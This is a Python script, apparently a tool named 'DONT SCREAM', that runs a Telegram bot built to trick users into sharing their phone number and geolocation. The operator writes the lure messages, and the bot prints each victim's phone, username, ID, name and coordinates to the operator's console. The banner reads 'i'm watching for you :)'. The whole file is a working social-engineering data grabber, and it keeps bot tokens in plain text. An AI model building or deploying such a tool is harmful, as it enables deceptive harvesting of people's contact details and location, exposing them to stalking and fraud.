from rich.console import Console
from rich.panel import Panel
from rich import box
from os import system, listdir
from telebot import types
from sys import exit
import telebot

console = Console()
startMessage = ''
buttonText = ''
buttonRequestText = ''
contactGrabText = ''
geoRequestText = ''
geoRequest = False

def botlist():
    files = listdir("bots")
    text = ''
    for name in files:
        fle = open("bots\\"+name, 'r')
        token = fle.read()
        fle.close()

        text += "|#|"+name.replace(".txt", '')+": "+token+"\n"

    console.print(Panel.fit(text.strip(), box=box.ASCII, border_style='red', style='red1'))


def bot(botName):
    file = open("bots\\"+botName, 'r')
    token = file.read()
    file.close()

    bot = telebot.TeleBot(token)

    @bot.message_handler(commands=["start"])
    def start(message):
        try:
            bot.send_message(message.chat.id, startMessage)
            
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button = types.KeyboardButton(text=buttonText, 
                request_contact=True)
            keyboard.add(button)
            phone = bot.send_message(message.chat.id, contactGrabText, reply_markup=keyboard)

            bot.register_next_step_handler(phone, sendPhone)

            if geoRequest:
                bot.register_next_step_handler(phone, requestGeolocation)
        
        except AttributeError:
            pass

    def sendPhone(message):
        console.print(Panel.fit(f"""
Phone: {message.contact.phone_number}
Username: {message.chat.username}
ID: {message.chat.id}
Name: {message.chat.first_name}
            """.strip()))

    @bot.message_handler(content_types=["location"])
    def requestGeolocation(message):
        try:
            keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
            button = types.KeyboardButton(text=buttonRequestText, 
             request_location=True)
            keyboard.add(button)
            geo = bot.send_message(message.chat.id, geoRequestText, reply_markup=keyboard)

            
            bot.register_next_step_handler(geo, sendGeo)

        except AttributeError:
            pass

    def sendGeo(message):
        console.print(Panel.fit(f"""GEOLOCATION: latitude: {message.location.latitude}; longitude: {message.location.longitude}""", 
            border_style='red1'))
    @bot.message_handler(content_types=["text"])
    def text(message):
        console.print('\n'+message.text)

    bot.infinity_polling()

def newBotSave(token, botname='newBot.txt'):
    bot = open("bots\\"+botname, 'w')
    bot.write(token)
    bot.close()

    


panel = '''
(1)>[NEW BOT TOKEN]
(2)>[LOAD TOKEN]
(3)>[MY TOKENS]
(4)>[EXIT]
'''.strip()
logo = '''                                                               
@@@@@@@    @@@@@@   @@@  @@@  @@@  @@@@@@@           
@@@@@@@@  @@@@@@@@  @@@@ @@@   @@  @@@@@@@          
@@!  @@@  @@!  @@@  @@!@!@@@  @!     @@!            
!@!  @!@  !@!  @!@  !@!!@!@!         !@!          
@!@  !@!  @!@  !@!  @!@ !!@!         @!!          
!@!  !!!  !@!  !!!  !@!  !!!         !!!                
!!:  !!!  !!:  !!!  !!:  !!!         !!:  [magenta]+---------------+[/]                    
:!:  !:!  :!:  !:!  :!:  !:!         :!:  [magenta]|   by The361   |[/]                      
 :::: ::  ::::: ::   ::   ::          ::  [magenta]|t.me/the361soft|[/]   	             
:: :  :    : :  :   ::    :           :   [magenta]+---------------+[/]                      

 @@@@@@    @@@@@@@  @@@@@@@   @@@@@@@@   @@@@@@   @@@@@@@@@@   
@@@@@@@   @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@@@@  
!@@       !@@       @@!  @@@  @@!       @@!  @@@  @@! @@! @@!  
!@!       !@!       !@!  @!@  !@!       !@!  @!@  !@! !@! !@!  
!!@@!!    !@!       @!@!!@!   @!!!:!    @!@!@!@!  @!! !!@ @!@  
 !!@!!!   !!!       !!@!@!    !!!!!:    !!!@!!!!  !@!   ! !@!  
     !:!  :!!       !!: :!!   !!:       !!:  !!!  !!:     !!:  
    !:!   :!:       :!:  !:!  :!:       :!:  !:!  :!:     :!:  
:::: ::    ::: :::  ::   :::   :: ::::  ::   :::  :::     :: i'm watching  
:: : :     :: :: :   :   : :  : :: ::    :   : :   :      :  for you :)
'''.strip()


system('cls')
console.print(logo, style='red1')
print('\n')
console.print(Panel.fit(panel, box=box.ASCII, border_style='red1', style='bold red1'))

while True:
    choice = console.input("[red1]|SELECT|> [/]")

    if choice == '1':
        tok = console.input("[red1]|INPUT BOT TOKEN|> [/]")
        name = console.input("[red1]|INPUT BOT NAME|> [/]")
        startMessage = console.input("[red1]|INPUT BOT START MESSAGE|> [/]")
        buttonText = console.input("[red1]|INPUT BOT BUTTON TEXT|> [/]")
        contactGrabText = console.input("[red1]|INPUT BOT CONTACT REQUEST TEXT|> [/]")

        while True:
            request = console.input("[red1]|SEND REQUEST FOR GEOLOCATON?(Y/N)|> [/]")
            if request.lower() == "y":
                geoRequestText = console.input("[red1]|INPUT BOT GEOLOCATION REQUEST TEXT|> [/]") 
                buttonRequestText = console.input("[red1]|INPUT BOT GEOLOCATION BUTTON REQUEST TEXT|> [/]")
                geoRequest = True
                break

            elif request.lower() == "n":
                break

            else:
                console.print("[red]WRONG INPUT[/]")
                continue

        newBotSave(tok, botname=name+".txt")
        bot(name+".txt")

    elif choice == '2':
        name = console.input("[red1]|INPUT BOT NAME|> [/]")
        startMessage = console.input("[red1]|INPUT BOT START MESSAGE|> [/]")
        buttonText = console.input("[red1]|INPUT BOT BUTTON TEXT|> [/]")
        contactGrabText = console.input("[red1]|INPUT BOT CONTACT REQUEST TEXT|> [/]")

        while True:
            request = console.input("[red1]|SEND REQUEST FOR GEOLOCATON?(Y/N)|> [/]")
            if request.lower() == "y":
                geoRequestText = console.input("[red1]|INPUT BOT GEOLOCATION REQUEST TEXT|> [/]")
                buttonRequestText = console.input("[red1]|INPUT BOT GEOLOCATION BUTTON REQUEST TEXT|> [/]")
                geoRequest = True
                break

            elif request.lower() == "n":
                break

            else:
                console.print("[red]WRONG INPUT[/]")
                continue

        bot(name+".txt")

    elif choice == '3':
        botlist()
        continue

    elif choice == '4':
        exit()

    else:
        console.print("[red]WRONG INPUT[/]")
        continue
